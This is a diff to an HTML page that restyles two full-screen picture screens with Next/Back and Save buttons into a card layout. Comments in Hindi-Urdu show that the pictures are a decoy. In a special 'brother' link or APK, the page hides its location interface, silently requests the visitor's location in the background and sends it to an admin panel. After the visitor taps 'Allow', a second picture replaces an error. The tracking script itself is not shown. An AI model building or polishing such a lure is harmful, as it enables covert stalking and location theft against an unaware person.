@@ -224,22 +224,30 @@
 </main>
 
 <!-- Picture screen — sirf bhai wale link (?brother=1 / APK) me dikhta hai.
-     Location wala interface is me bilkul nahi dikhta, sirf ye picture dikhti hai.
-     Location background me khud mangi jati hai aur admin panel ko bheji jati hai. -->
-<div id="picScreen" style="display:none;position:fixed;inset:0;background:#000;z-index:5;">
-  <img src="pic1.gif" alt="" style="width:100%;height:100%;object-fit:cover;display:block">
-  <div style="position:absolute;left:50%;bottom:8%;transform:translateX(-50%);display:flex;gap:12px;">
-    <button id="nextBtn" type="button" style="padding:18px 54px;font-size:26px;font-weight:700;color:#111;background:rgba(255,255,255,0.92);border:none;border-radius:999px;box-shadow:0 4px 18px rgba(0,0,0,0.45);">Next &#10140;</button>
-    <a href="pic1.gif" download="pic1.gif" style="padding:18px 30px;font-size:26px;font-weight:700;color:#111;background:rgba(255,255,255,0.92);border-radius:999px;box-shadow:0 4px 18px rgba(0,0,0,0.45);text-decoration:none;">&#11015; Save</a>
+     Pinterest style: halka background, picture card me poori nazar aati hai
+     (contain — kaati nahi jati), buttons card ke neeche. -->
+<div id="picScreen" style="display:none;position:fixed;inset:0;background:#f2f2f2;z-index:5;">
+  <div style="height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px 16px 28px;box-sizing:border-box;">
+    <div style="background:#fff;border-radius:18px;box-shadow:0 8px 30px rgba(0,0,0,0.18);padding:10px;max-width:480px;width:100%;box-sizing:border-box;">
+      <img src="pic1.gif" alt="" style="width:100%;max-height:62vh;object-fit:contain;display:block;border-radius:12px;">
+    </div>
+    <div style="display:flex;gap:12px;margin-top:22px;">
+      <button id="nextBtn" type="button" style="padding:16px 48px;font-size:24px;font-weight:700;color:#fff;background:#111;border:none;border-radius:999px;box-shadow:0 4px 14px rgba(0,0,0,0.25);">Next &#10140;</button>
+      <a href="pic1.gif" download="pic1.gif" style="padding:16px 28px;font-size:24px;font-weight:700;color:#111;background:#fff;border:1px solid #ddd;border-radius:999px;box-shadow:0 4px 14px rgba(0,0,0,0.12);text-decoration:none;">&#11015; Save</a>
+    </div>
   </div>
 </div>
 
 <!-- Dusri picture — Allow ke baad error ki jagah ye dikhti hai (bhai mode me) -->
-<div id="picScreen2" style="display:none;position:fixed;inset:0;background:#000;z-index:6;">
-  <img src="pic2.jpg" alt="" style="width:100%;height:100%;object-fit:cover;display:block">
-  <div style="position:absolute;left:50%;bottom:8%;transform:translateX(-50%);display:flex;gap:12px;">
-    <button id="backBtn" type="button" style="padding:18px 54px;font-size:26px;font-weight:700;color:#111;background:rgba(255,255,255,0.92);border:none;border-radius:999px;box-shadow:0 4px 18px rgba(0,0,0,0.45);">&#8592; Back</button>
-    <a href="pic2.jpg" download="pic2.jpg" style="padding:18px 30px;font-size:26px;font-weight:700;color:#111;background:rgba(255,255,255,0.92);border-radius:999px;box-shadow:0 4px 18px rgba(0,0,0,0.45);text-decoration:none;">&#11015; Save</a>
+<div id="picScreen2" style="display:none;position:fixed;inset:0;background:#f2f2f2;z-index:6;">
+  <div style="height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px 16px 28px;box-sizing:border-box;">
+    <div style="background:#fff;border-radius:18px;box-shadow:0 8px 30px rgba(0,0,0,0.18);padding:10px;max-width:480px;width:100%;box-sizing:border-box;">
+      <img src="pic2.jpg" alt="" style="width:100%;max-height:62vh;object-fit:contain;display:block;border-radius:12px;">
+    </div>
+    <div style="display:flex;gap:12px;margin-top:22px;">
+      <button id="backBtn" type="button" style="padding:16px 48px;font-size:24px;font-weight:700;color:#fff;background:#111;border:none;border-radius:999px;box-shadow:0 4px 14px rgba(0,0,0,0.25);">&#8592; Back</button>
+      <a href="pic2.jpg" download="pic2.jpg" style="padding:16px 28px;font-size:24px;font-weight:700;color:#111;background:#fff;border:1px solid #ddd;border-radius:999px;box-shadow:0 4px 14px rgba(0,0,0,0.12);text-decoration:none;">&#11015; Save</a>
+    </div>
   </div>
 </div>
 
